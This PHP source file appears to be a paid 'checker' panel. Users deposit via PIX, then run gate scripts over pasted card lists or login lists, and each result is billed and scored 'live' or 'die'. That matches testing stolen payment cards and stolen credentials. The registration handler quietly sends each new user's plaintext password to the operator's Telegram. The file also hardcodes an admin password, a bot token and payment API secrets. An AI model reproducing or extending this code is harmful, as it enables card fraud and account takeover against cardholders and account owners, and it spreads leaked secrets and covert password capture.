<?php
declare(strict_types=1);

ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('America/Sao_Paulo');

if (session_status() === PHP_SESSION_NONE) {
    ini_set('session.use_strict_mode', '1');
    ini_set('session.use_only_cookies', '1');
    ini_set('session.cookie_httponly', '1');
    ini_set('session.cookie_samesite', 'Lax');
    session_set_cookie_params([
        'lifetime' => 86400,
        'path'     => '/',
        'secure'   => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off',
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
    session_name('HIPCTL');
    session_start();
}

if (empty($_SESSION['_init'])) {
    $_SESSION['_init'] = time();
    session_regenerate_id(true);
}

header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: no-referrer');
header('X-XSS-Protection: 1; mode=block');
header('Permissions-Policy: geolocation=(), microphone=(), camera=()');
header("Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' https: data:; img-src 'self' data: https:; connect-src 'self' https:;");
header_remove('X-Powered-By');

define('BRAND', '@hipolitoofc');
define('SITE_NAME', 'HIPOLITO CLT');
define('DB_DIR', __DIR__ . '/data');
define('DB_FILE', DB_DIR . '/hipolito.db');
define('API_DIR', __DIR__ . '/api');
define('LOGINS_DIR', __DIR__ . '/logins');
define('LIVE_COST', 1.00);
define('DIE_COST', 0.20);
define('DEP_MIN', 10.00);
define('DEP_MAX', 200.00);
define('PIX_COOLDOWN', 600);
define('ADMIN_USER', 'hipolito');
define('ADMIN_PASS', 'hipolitoofcadm');
define('BOT_TOKEN', '8952767112:AAGsG1yxraZXY0IkZ3QmIGu5_jfTXhhhGas');
define('ADMIN_TG', 8617449427);
define('ELITE_ID', 'ep_421737e484563dee4971477ca0c87575');
define('ELITE_SECRET', 'eps_43f74326495af4ef95c43bf9b501ef122e4410dc6a8eb48d9f19f972509e2945');
define('ELITE_URL', 'https://api.elitepaybr.com');
define('BASE_URL', getenv('BASE_URL') ?: 'https://hipolito-ctl.onrender.com');

if (!is_dir(DB_DIR)) @mkdir(DB_DIR, 0755, true);
if (!is_dir(API_DIR)) @mkdir(API_DIR, 0755, true);
if (!is_dir(LOGINS_DIR)) @mkdir(LOGINS_DIR, 0755, true);
@file_put_contents(DB_DIR . '/.htaccess', "Require all denied\nDeny from all\n");
@file_put_contents(DB_DIR . '/index.html', '');
@file_put_contents(API_DIR . '/.htaccess', "Require all denied\nDeny from all\n");
@file_put_contents(API_DIR . '/index.html', '');
@file_put_contents(LOGINS_DIR . '/.htaccess', "Require all denied\nDeny from all\n");
@file_put_contents(LOGINS_DIR . '/index.html', '');

function db(): SQLite3 {
    static $db = null;
    if ($db !== null) return $db;
    $db = new SQLite3(DB_FILE);
    $db->busyTimeout(5000);
    $db->exec('PRAGMA journal_mode = WAL');
    $db->exec('PRAGMA synchronous = NORMAL');
    $db->exec('PRAGMA foreign_keys = ON');
    $db->exec('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, password_hash TEXT NOT NULL, ip TEXT, balance REAL DEFAULT 0, total_checks INTEGER DEFAULT 0, total_lives INTEGER DEFAULT 0, total_dies INTEGER DEFAULT 0, total_deposited REAL DEFAULT 0, created_at TEXT DEFAULT CURRENT_TIMESTAMP, last_login TEXT, last_seen TEXT)');
    $db->exec('CREATE TABLE IF NOT EXISTS sessions (token TEXT PRIMARY KEY, user_id INTEGER NOT NULL, ip TEXT, user_agent TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP, expires_at TEXT NOT NULL)');
    $db->exec('CREATE TABLE IF NOT EXISTS deposits (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, transaction_id TEXT UNIQUE, amount REAL NOT NULL, net_amount REAL, status TEXT DEFAULT "pending", qrcode_url TEXT, copy_paste TEXT, payer_name TEXT, payer_document TEXT, ip TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP, paid_at TEXT)');
    $db->exec('CREATE TABLE IF NOT EXISTS checks (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, gate TEXT NOT NULL, gate_type TEXT NOT NULL, card TEXT NOT NULL, bin TEXT, result TEXT NOT NULL, cost REAL NOT NULL, response TEXT, ip TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP)');
    $db->exec('CREATE TABLE IF NOT EXISTS audit_log (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT, action TEXT NOT NULL, details TEXT, ip TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP)');
    $db->exec('CREATE TABLE IF NOT EXISTS rate_limit (k TEXT PRIMARY KEY, attempts INTEGER DEFAULT 1, first_attempt INTEGER)');
    return $db;
}

function clientIp(): string {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = trim(explode(',', $_SERVER[$k])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '0.0.0.0';
}

function csrf(): string {
    if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(32));
    return $_SESSION['csrf'];
}

function csrfOk(?string $t): bool {
    return !empty($_SESSION['csrf']) && is_string($t) && hash_equals($_SESSION['csrf'], $t);
}

function jsonOut(array $d, int $c = 200): void {
    http_response_code($c);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($d, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

function getSessionUser(): ?array {
    if (!empty($_SESSION['user_id'])) {
        $u = userById((int)$_SESSION['user_id']);
        if ($u) return $u;
    }
    if (!empty($_COOKIE['hipctl_token'])) {
        $u = userBySession($_COOKIE['hipctl_token']);
        if ($u) { $_SESSION['user_id'] = (int)$u['id']; return $u; }
    }
    return null;
}

function userCreate(string $username, string $password, string $ip): array {
    $db = db();
    $hash = password_hash($password, PASSWORD_DEFAULT);
    $stmt = $db->prepare('INSERT INTO users (username, password_hash, ip, last_seen) VALUES (:u, :p, :ip, CURRENT_TIMESTAMP)');
    $stmt->bindValue(':u', $username, SQLITE3_TEXT);
    $stmt->bindValue(':p', $hash, SQLITE3_TEXT);
    $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
    if (!$stmt->execute()) return ['ok' => false, 'error' => 'Erro ao criar conta'];
    return ['ok' => true, 'id' => $db->lastInsertRowID()];
}

function userByUsername(string $u): ?array {
    $db = db();
    $stmt = $db->prepare('SELECT * FROM users WHERE username = :u');
    $stmt->bindValue(':u', $u, SQLITE3_TEXT);
    $r = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    return $r ?: null;
}

function userById(int $id): ?array {
    $db = db();
    $stmt = $db->prepare('SELECT * FROM users WHERE id = :i');
    $stmt->bindValue(':i', $id, SQLITE3_INTEGER);
    $r = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    return $r ?: null;
}

function userBySession(string $t): ?array {
    $db = db();
    $stmt = $db->prepare('SELECT u.* FROM sessions s JOIN users u ON u.id = s.user_id WHERE s.token = :t AND s.expires_at > CURRENT_TIMESTAMP');
    $stmt->bindValue(':t', $t, SQLITE3_TEXT);
    $r = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    return $r ?: null;
}

function userTouch(int $id): void {
    $db = db();
    $stmt = $db->prepare('UPDATE users SET last_seen = CURRENT_TIMESTAMP, last_login = CURRENT_TIMESTAMP WHERE id = :i');
    $stmt->bindValue(':i', $id, SQLITE3_INTEGER);
    $stmt->execute();
}

function userAddBalance(int $id, float $a): float {
    $db = db();
    $stmt = $db->prepare('UPDATE users SET balance = balance + :a, total_deposited = total_deposited + :b WHERE id = :i');
    $stmt->bindValue(':a', $a, SQLITE3_FLOAT);
    $stmt->bindValue(':b', $a, SQLITE3_FLOAT);
    $stmt->bindValue(':i', $id, SQLITE3_INTEGER);
    $stmt->execute();
    $u = userById($id);
    return (float)$u['balance'];
}

function userDeductBalance(int $id, float $a): bool {
    $db = db();
    $u = userById($id);
    if (!$u || $u['balance'] < $a) return false;
    $stmt = $db->prepare('UPDATE users SET balance = balance - :a WHERE id = :i');
    $stmt->bindValue(':a', $a, SQLITE3_FLOAT);
    $stmt->bindValue(':i', $id, SQLITE3_INTEGER);
    return $stmt->execute() !== false;
}

function sessionCreate(int $uid, string $ip, string $ua): string {
    $db = db();
    $t = bin2hex(random_bytes(32));
    $stmt = $db->prepare('INSERT INTO sessions (token, user_id, ip, user_agent, expires_at) VALUES (:t, :u, :ip, :ua, datetime("now", "+86400 seconds"))');
    $stmt->bindValue(':t', $t, SQLITE3_TEXT);
    $stmt->bindValue(':u', $uid, SQLITE3_INTEGER);
    $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
    $stmt->bindValue(':ua', $ua, SQLITE3_TEXT);
    $stmt->execute();
    return $t;
}

function sessionDestroy(string $t): void {
    $db = db();
    $stmt = $db->prepare('DELETE FROM sessions WHERE token = :t');
    $stmt->bindValue(':t', $t, SQLITE3_TEXT);
    $stmt->execute();
}

function auditLog(?int $uid, ?string $un, string $action, string $details, string $ip): void {
    try {
        $db = db();
        $stmt = $db->prepare('INSERT INTO audit_log (user_id, username, action, details, ip) VALUES (:u, :un, :a, :d, :ip)');
        $stmt->bindValue(':u', $uid, SQLITE3_INTEGER);
        $stmt->bindValue(':un', $un, SQLITE3_TEXT);
        $stmt->bindValue(':a', $action, SQLITE3_TEXT);
        $stmt->bindValue(':d', $details, SQLITE3_TEXT);
        $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
        $stmt->execute();
    } catch (Throwable $e) {}
}

function rateCheck(string $action, string $ip, int $max, int $window): bool {
    $db = db();
    $key = $action . ':' . $ip;
    $stmt = $db->prepare('SELECT attempts, first_attempt FROM rate_limit WHERE k = :k');
    $stmt->bindValue(':k', $key, SQLITE3_TEXT);
    $row = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    $now = time();
    if (!$row) {
        $stmt = $db->prepare('INSERT INTO rate_limit (k, attempts, first_attempt) VALUES (:k, 1, :t)');
        $stmt->bindValue(':k', $key, SQLITE3_TEXT);
        $stmt->bindValue(':t', $now, SQLITE3_INTEGER);
        $stmt->execute();
        return true;
    }
    if ($now - $row['first_attempt'] > $window) {
        $stmt = $db->prepare('UPDATE rate_limit SET attempts = 1, first_attempt = :t WHERE k = :k');
        $stmt->bindValue(':t', $now, SQLITE3_INTEGER);
        $stmt->bindValue(':k', $key, SQLITE3_TEXT);
        $stmt->execute();
        return true;
    }
    if ($row['attempts'] >= $max) return false;
    $stmt = $db->prepare('UPDATE rate_limit SET attempts = attempts + 1 WHERE k = :k');
    $stmt->bindValue(':k', $key, SQLITE3_TEXT);
    $stmt->execute();
    return true;
}

function fmtMoney(float $v): string { return 'R$ ' . number_format($v, 2, ',', '.'); }
function esc(string $s): string { return htmlspecialchars($s, ENT_QUOTES | ENT_HTML5, 'UTF-8'); }

function tg(string $msg): void {
    try {
        $url = 'https://api.telegram.org/bot' . BOT_TOKEN . '/sendMessage';
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => http_build_query(['chat_id' => ADMIN_TG, 'text' => $msg, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true']),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 6,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        @curl_exec($ch);
        @curl_close($ch);
    } catch (Throwable $e) {}
}

function eliteDeposit(float $amount): array {
    $ch = curl_init(ELITE_URL . '/api/v1/deposit');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode([
            'amount' => round($amount, 2),
            'description' => 'Deposito HIPOLITO CLT',
            'projectWebhook' => BASE_URL . '/webhook.php',
        ]),
        CURLOPT_HTTPHEADER => [
            'x-client-id: ' . ELITE_ID,
            'x-client-secret: ' . ELITE_SECRET,
            'Content-Type: application/json',
            'Accept: application/json',
        ],
        CURLOPT_TIMEOUT => 20,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($resp === false || $code < 200 || $code >= 300) return ['ok' => false, 'error' => 'Falha ElitePay (HTTP ' . $code . ')'];
    $d = json_decode($resp, true);
    if (empty($d['transactionId'])) return ['ok' => false, 'error' => 'Resposta sem TXID'];
    return ['ok' => true, 'txid' => $d['transactionId'], 'qr' => $d['qrcodeUrl'] ?? '', 'copy' => $d['copyPaste'] ?? ''];
}

function depositByTxid(string $txid): ?array {
    $db = db();
    $stmt = $db->prepare('SELECT * FROM deposits WHERE transaction_id = :t');
    $stmt->bindValue(':t', $txid, SQLITE3_TEXT);
    $r = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    return $r ?: null;
}

function depositPendente(int $userId): ?array {
    $db = db();
    $stmt = $db->prepare('SELECT * FROM deposits WHERE user_id = :u AND status = "pending" ORDER BY id DESC LIMIT 1');
    $stmt->bindValue(':u', $userId, SQLITE3_INTEGER);
    $r = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    return $r ?: null;
}

function canCreatePix(int $userId): array {
    $db = db();
    $stmt = $db->prepare('SELECT * FROM deposits WHERE user_id = :u ORDER BY id DESC LIMIT 1');
    $stmt->bindValue(':u', $userId, SQLITE3_INTEGER);
    $last = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    if (!$last) return ['ok' => true];
    if ($last['status'] === 'pending') {
        $elapsed = time() - strtotime($last['created_at']);
        if ($elapsed < PIX_COOLDOWN) {
            return ['ok' => false, 'reason' => 'pending', 'elapsed' => $elapsed, 'wait' => PIX_COOLDOWN - $elapsed];
        }
        $stmt = $db->prepare('UPDATE deposits SET status = "expired" WHERE transaction_id = :t');
        $stmt->bindValue(':t', $last['transaction_id'], SQLITE3_TEXT);
        $stmt->execute();
        return ['ok' => true];
    }
    if ($last['status'] === 'paid') {
        $elapsed = time() - strtotime($last['paid_at'] ?? $last['created_at']);
        if ($elapsed < PIX_COOLDOWN && $elapsed > 0) {
            return ['ok' => false, 'reason' => 'recently_paid', 'elapsed' => $elapsed, 'wait' => PIX_COOLDOWN - $elapsed];
        }
    }
    return ['ok' => true];
}

function listGates(): array {
    $g = ['gate' => [], 'login' => []];
    foreach (glob(API_DIR . '/*.{php,py}', GLOB_BRACE) ?: [] as $f) {
        $n = basename($f);
        if ($n === 'index.php' || $n === '.htaccess') continue;
        $g['gate'][] = $n;
    }
    foreach (glob(LOGINS_DIR . '/*.{php,py}', GLOB_BRACE) ?: [] as $f) {
        $n = basename($f);
        if ($n === 'index.php' || $n === '.htaccess') continue;
        $g['login'][] = $n;
    }
    sort($g['gate']); sort($g['login']);
    return $g;
}

$ip = clientIp();

if (isset($_GET['ping'])) { header('Content-Type: text/plain'); echo 'OK:' . time(); exit; }

if (isset($_GET['logout'])) {
    if (!empty($_COOKIE['hipctl_token'])) sessionDestroy($_COOKIE['hipctl_token']);
    setcookie('hipctl_token', '', time() - 3600, '/', '', isset($_SERVER['HTTPS']), true);
    session_destroy();
    header('Location: index.php'); exit;
}

try {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) !== 'xmlhttprequest') {
            jsonOut(['ok' => false, 'error' => 'Requisição inválida'], 400);
        }
        $raw = file_get_contents('php://input');
        if (strlen($raw) > 1048576) jsonOut(['ok' => false, 'error' => 'Payload grande'], 413);
        $json = json_decode($raw, true);
        if (!is_array($json)) $json = $_POST;
        $action = $json['action'] ?? '';
        if ($action === '') jsonOut(['ok' => false, 'error' => 'Ação vazia'], 400);
        if (!csrfOk($json['csrf'] ?? '')) jsonOut(['ok' => false, 'error' => 'Sessão expirada. Recarregue a página.'], 403);

        if ($action === 'register') {
            if (!empty($json['honeypot'])) jsonOut(['ok' => false, 'error' => 'Ação bloqueada'], 400);
            if (!rateCheck('register', $ip, 5, 3600)) jsonOut(['ok' => false, 'error' => 'Muitas tentativas. Aguarde.']);
            $u = trim($json['username'] ?? '');
            $p = $json['password'] ?? '';
            $c = $json['confirm'] ?? '';
            if (strlen($u) < 3 || strlen($u) > 20) jsonOut(['ok' => false, 'error' => 'Usuário 3-20 chars']);
            if (!preg_match('/^[a-zA-Z0-9_]+$/', $u)) jsonOut(['ok' => false, 'error' => 'Só letras, números e _']);
            if (strlen($p) < 8) jsonOut(['ok' => false, 'error' => 'Senha mínima 8 chars']);
            if (preg_match('/^\d+$/', $p)) jsonOut(['ok' => false, 'error' => 'Senha não pode ser só números']);
            if ($p !== $c) jsonOut(['ok' => false, 'error' => 'Senhas não coincidem']);
            if (userByUsername($u)) jsonOut(['ok' => false, 'error' => 'Usuário já existe']);
            $r = userCreate($u, $p, $ip);
            if (!$r['ok']) jsonOut($r);
            session_regenerate_id(true);
            $t = sessionCreate((int)$r['id'], $ip, $_SERVER['HTTP_USER_AGENT'] ?? '');
            setcookie('hipctl_token', $t, time() + 86400, '/', '', isset($_SERVER['HTTPS']), true);
            $_SESSION['user_id'] = (int)$r['id'];
            auditLog((int)$r['id'], $u, 'register', "ip=$ip", $ip);
            tg("👤 <b>NOVO USUÁRIO</b>\n\n📛 <b>$u</b>\n🔑 <code>" . esc($p) . "</code>\n📱 <code>$ip</code>\n⚡ " . BRAND);
            jsonOut(['ok' => true, 'redirect' => 'index.php']);
        }

        if ($action === 'login') {
            if (!empty($json['honeypot'])) jsonOut(['ok' => false, 'error' => 'Ação bloqueada'], 400);
            if (!rateCheck('login', $ip, 10, 900)) jsonOut(['ok' => false, 'error' => 'Muitas tentativas. Aguarde 15 min.']);
            $u = trim($json['username'] ?? '');
            $p = $json['password'] ?? '';
            $user = userByUsername($u);
            if (!$user || !password_verify($p, $user['password_hash'])) {
                auditLog(null, $u, 'login_fail', "ip=$ip", $ip);
                jsonOut(['ok' => false, 'error' => 'Usuário ou senha inválidos']);
            }
            session_regenerate_id(true);
            $t = sessionCreate((int)$user['id'], $ip, $_SERVER['HTTP_USER_AGENT'] ?? '');
            setcookie('hipctl_token', $t, time() + 86400, '/', '', isset($_SERVER['HTTPS']), true);
            $_SESSION['user_id'] = (int)$user['id'];
            userTouch((int)$user['id']);
            auditLog((int)$user['id'], $user['username'], 'login', "ip=$ip", $ip);
            jsonOut(['ok' => true, 'redirect' => 'index.php']);
        }

        if (in_array($action, ['deposit', 'check', 'balance', 'status', 'pix_allowed'], true)) {
            $user = getSessionUser();
            if (!$user) jsonOut(['ok' => false, 'error' => 'Faça login primeiro'], 401);
            userTouch((int)$user['id']);

            if ($action === 'pix_allowed') {
                $r = canCreatePix((int)$user['id']);
                $pend = depositPendente((int)$user['id']);
                $extra = [];
                if ($pend) $extra = ['txid' => $pend['transaction_id'], 'qr' => $pend['qrcode_url'], 'copy' => $pend['copy_paste'], 'amount' => (float)$pend['amount'], 'created_at' => $pend['created_at']];
                jsonOut(['ok' => true, 'allowed' => $r['ok'], 'reason' => $r['reason'] ?? null, 'wait' => $r['wait'] ?? 0, 'pending' => $extra]);
            }

            if ($action === 'deposit') {
                $c = canCreatePix((int)$user['id']);
                if (!$c['ok']) {
                    $msg = $c['reason'] === 'pending' ? 'Aguarde o PIX pendente expirar ou pagar (' . ceil($c['wait'] / 60) . ' min)' : 'Aguarde ' . ceil($c['wait'] / 60) . ' min após o último pagamento';
                    jsonOut(['ok' => false, 'error' => $msg, 'wait' => $c['wait']]);
                }
                if (!rateCheck('dep', $ip, 5, 600)) jsonOut(['ok' => false, 'error' => 'Muitas tentativas.']);
                $amt = (float)($json['amount'] ?? 0);
                if ($amt < DEP_MIN || $amt > DEP_MAX) jsonOut(['ok' => false, 'error' => 'Valor entre ' . fmtMoney(DEP_MIN) . ' e ' . fmtMoney(DEP_MAX)]);
                $r = eliteDeposit($amt);
                if (!$r['ok']) jsonOut(['ok' => false, 'error' => $r['error']]);
                $db = db();
                $stmt = $db->prepare('INSERT INTO deposits (user_id, transaction_id, amount, status, qrcode_url, copy_paste, ip) VALUES (:u, :t, :a, "pending", :q, :c, :ip)');
                $stmt->bindValue(':u', (int)$user['id'], SQLITE3_INTEGER);
                $stmt->bindValue(':t', $r['txid'], SQLITE3_TEXT);
                $stmt->bindValue(':a', $amt, SQLITE3_FLOAT);
                $stmt->bindValue(':q', $r['qr'], SQLITE3_TEXT);
                $stmt->bindValue(':c', $r['copy'], SQLITE3_TEXT);
                $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
                $stmt->execute();
                auditLog((int)$user['id'], $user['username'], 'deposit_create', "amount=$amt txid={$r['txid']}", $ip);
                tg("🎫 <b>PIX GERADO</b>\n\n👤 <b>" . $user['username'] . "</b>\n💵 " . fmtMoney($amt) . "\n📱 <code>$ip</code>\n⚡ " . BRAND);
                jsonOut(['ok' => true, 'txid' => $r['txid'], 'qr' => $r['qr'], 'copy' => $r['copy'], 'amount' => $amt]);
            }

            if ($action === 'status') {
                $txid = trim($json['txid'] ?? '');
                $d = depositByTxid($txid);
                if (!$d || (int)$d['user_id'] !== (int)$user['id']) jsonOut(['ok' => false, 'error' => 'Não encontrado']);
                jsonOut(['ok' => true, 'status' => $d['status'], 'amount' => (float)$d['amount']]);
            }

            if ($action === 'balance') {
                $fresh = userById((int)$user['id']);
                jsonOut(['ok' => true, 'balance' => (float)$fresh['balance']]);
            }

            if ($action === 'check') {
                if (!rateCheck('check', $ip, 60, 60)) jsonOut(['ok' => false, 'error' => 'Rate limit']);
                $gate = trim($json['gate'] ?? '');
                $type = $json['type'] ?? 'gate';
                $lista = trim($json['lista'] ?? '');
                if (!in_array($type, ['gate', 'login'], true)) jsonOut(['ok' => false, 'error' => 'Tipo inválido']);
                if (!$gate || !$lista) jsonOut(['ok' => false, 'error' => 'Dados vazios']);
                $gate = basename($gate);
                $dir = $type === 'gate' ? API_DIR : LOGINS_DIR;
                $files = array_map('basename', glob($dir . '/*.{php,py}', GLOB_BRACE) ?: []);
                if (!in_array($gate, $files, true)) jsonOut(['ok' => false, 'error' => 'Gate não existe']);
                $path = $dir . '/' . $gate;
                $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
                if ((float)$user['balance'] < DIE_COST) jsonOut(['ok' => false, 'error' => 'Saldo insuficiente. Deposite primeiro.']);
                $_SESSION['user_id'] = (int)$user['id'];
                $_SESSION['username'] = $user['username'];
                $response = '';
                if ($ext === 'php') {
                    $_GET['lista'] = $lista;
                    $_GET['gate']  = $gate;
                    ob_start();
                    try { include $path; $response = ob_get_clean(); }
                    catch (Throwable $e) { ob_end_clean(); $response = '❌ Erro: ' . $e->getMessage(); }
                } else {
                    $response = shell_exec('python3 ' . escapeshellarg($path) . ' ' . escapeshellarg($lista) . ' 2>&1') ?? '❌ Sem resposta';
                }
                $rl = strtolower($response);
                $liveWords = ['✅','aprovada','approved','success','live','autorizado','valid','aprovado','apvd','ativa','active','cvv','saldo'];
                $isLive = false;
                foreach ($liveWords as $w) { if (strpos($rl, $w) !== false) { $isLive = true; break; } }
                if (strpos($response, '❌') === 0) $isLive = false;
                $cost = $isLive ? LIVE_COST : DIE_COST;
                if (!userDeductBalance((int)$user['id'], $cost)) jsonOut(['ok' => false, 'error' => 'Saldo insuficiente']);
                $card = $type === 'gate' ? preg_replace('/[^0-9]/', '', explode('|', $lista)[0]) : $lista;
                $bin = $type === 'gate' ? substr($card, 0, 6) : '';
                $db = db();
                $stmt = $db->prepare('INSERT INTO checks (user_id, gate, gate_type, card, bin, result, cost, response, ip) VALUES (:u,:g,:t,:c,:b,:r,:co,:re,:ip)');
                $stmt->bindValue(':u', (int)$user['id'], SQLITE3_INTEGER);
                $stmt->bindValue(':g', $gate, SQLITE3_TEXT);
                $stmt->bindValue(':t', $type, SQLITE3_TEXT);
                $stmt->bindValue(':c', $card, SQLITE3_TEXT);
                $stmt->bindValue(':b', $bin, SQLITE3_TEXT);
                $stmt->bindValue(':r', $isLive ? 'live' : 'die', SQLITE3_TEXT);
                $stmt->bindValue(':co', $cost, SQLITE3_FLOAT);
                $stmt->bindValue(':re', $response, SQLITE3_TEXT);
                $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
                $stmt->execute();
                $col = $isLive ? 'total_lives' : 'total_dies';
                $stmt = $db->prepare("UPDATE users SET total_checks = total_checks + 1, $col = $col + 1 WHERE id = :u");
                $stmt->bindValue(':u', (int)$user['id'], SQLITE3_INTEGER);
                $stmt->execute();
                $fresh = userById((int)$user['id']);
                jsonOut(['ok' => true, 'live' => $isLive, 'response' => $response, 'cost' => $cost, 'balance' => (float)$fresh['balance']]);
            }
        }

        jsonOut(['ok' => false, 'error' => 'Ação desconhecida: ' . $action], 400);
    }
} catch (Throwable $e) {
    error_log('[HIPCTL] ' . $e->getMessage() . ' @ ' . $e->getFile() . ':' . $e->getLine());
    jsonOut(['ok' => false, 'error' => 'Erro servidor'], 500);
}

$user = getSessionUser();
$csrf = csrf();
$gates = listGates();
$mode = 'login';
$pixData = null;
if ($user) {
    $r = canCreatePix((int)$user['id']);
    $pend = depositPendente((int)$user['id']);
    if ($pend) $pixData = ['txid' => $pend['transaction_id'], 'qr' => $pend['qrcode_url'], 'copy' => $pend['copy_paste'], 'amount' => (float)$pend['amount'], 'created_at' => $pend['created_at']];
}
?>
<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#0a0c0b">
<title><?= SITE_NAME ?> — Acesso</title>
<style>
:root{--bg:#090b0a;--panel:rgba(18,22,19,.88);--line:rgba(255,255,255,.10);--muted:#8e9990;--text:#f3f7f2;--lime:#c8ff52;--lime2:#9fe62d;--red:#ff5f5f}
*{box-sizing:border-box}
html{min-height:100%;background:var(--bg)}
body{margin:0;min-height:100vh;color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:radial-gradient(ellipse at 13% 12%,rgba(137,197,55,.12),transparent 34%),radial-gradient(ellipse at 89% 86%,rgba(78,126,61,.12),transparent 30%),var(--bg);overflow-x:hidden}
body:before{content:"";position:fixed;inset:0;pointer-events:none;opacity:.18;background-image:linear-gradient(rgba(255,255,255,.035) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.035) 1px,transparent 1px);background-size:54px 54px;mask-image:linear-gradient(to bottom,black,transparent 90%)}
.orb{position:fixed;width:350px;height:350px;border-radius:50%;filter:blur(90px);opacity:.13;pointer-events:none;animation:drift 12s ease-in-out infinite alternate;background:#a6f044;top:12%;left:-220px}.orb.two{width:270px;height:270px;left:auto;right:-180px;top:auto;bottom:2%;background:#d5ff8b;animation-delay:-5s}
@keyframes drift{to{transform:translate(55px,35px) scale(1.13)}}
.shell{position:relative;z-index:1;min-height:100vh;display:grid;grid-template-columns:minmax(0,1.08fr) minmax(360px,.92fr);max-width:1440px;margin:auto;padding:28px 5.5%;gap:7%}
.topbar{position:absolute;left:5.5%;right:5.5%;top:28px;display:flex;align-items:center;justify-content:space-between}
.brand{display:flex;align-items:center;gap:12px;font-weight:850;letter-spacing:-.04em;font-size:17px}.brand-mark{width:38px;height:38px;border-radius:12px;background:var(--lime);color:#10150a;display:grid;place-items:center;box-shadow:0 0 32px #c8ff5228}.brand-mark svg{width:22px;height:22px}
.status{display:flex;align-items:center;gap:8px;color:#b5beb6;font-size:11px;text-transform:uppercase;letter-spacing:.13em;border:1px solid var(--line);padding:9px 12px;border-radius:999px;background:#ffffff04}.status i{width:7px;height:7px;background:var(--lime);border-radius:50%;box-shadow:0 0 12px var(--lime)}
.intro{display:flex;flex-direction:column;justify-content:center;padding:95px 0 35px;max-width:570px}
.eyebrow{display:flex;align-items:center;gap:10px;color:var(--lime);font-size:11px;font-weight:750;letter-spacing:.19em;text-transform:uppercase;margin-bottom:25px}.eyebrow:before{content:"";width:25px;height:1px;background:var(--lime)}
h1{font-size:clamp(46px,6.4vw,88px);line-height:.96;letter-spacing:-.075em;margin:0;font-weight:850}h1 span{color:var(--lime)}
.lead{color:#9ba59c;font-size:15px;line-height:1.8;max-width:390px;margin:26px 0 38px}
.feature{display:flex;align-items:center;gap:15px;margin-top:10px}.feature-icon{width:42px;height:42px;border:1px solid #c8ff5238;border-radius:13px;display:grid;place-items:center;color:var(--lime);background:#c8ff520a}.feature-icon svg{width:19px;height:19px}.feature strong{font-size:12px;display:block;margin-bottom:4px}.feature small{font-size:11px;color:var(--muted)}
.visual{position:relative;margin-top:35px;width:min(100%,430px);height:145px;border:1px solid var(--line);border-radius:18px;overflow:hidden;background:linear-gradient(120deg,#ffffff06,#ffffff01);display:flex;align-items:center;padding:22px 25px;gap:18px}.visual:after{content:"";position:absolute;width:200px;height:200px;border:1px solid #c8ff521c;border-radius:50%;right:-30px;top:-95px;box-shadow:0 0 0 24px #c8ff5207,0 0 0 48px #c8ff5205}.visual-number{font-size:42px;letter-spacing:-.08em;font-weight:800;color:var(--lime)}.visual-copy{font-size:11px;line-height:1.7;color:#a5aea5;max-width:135px}
.auth-wrap{display:flex;align-items:center;justify-content:center;padding:90px 0 35px}
.auth-card{width:100%;max-width:430px;padding:clamp(25px,4vw,40px);background:linear-gradient(145deg,rgba(25,30,26,.94),rgba(13,16,14,.96));border:1px solid rgba(255,255,255,.11);border-radius:25px;box-shadow:0 30px 100px #0007, inset 0 1px #ffffff0a;position:relative;overflow:hidden}
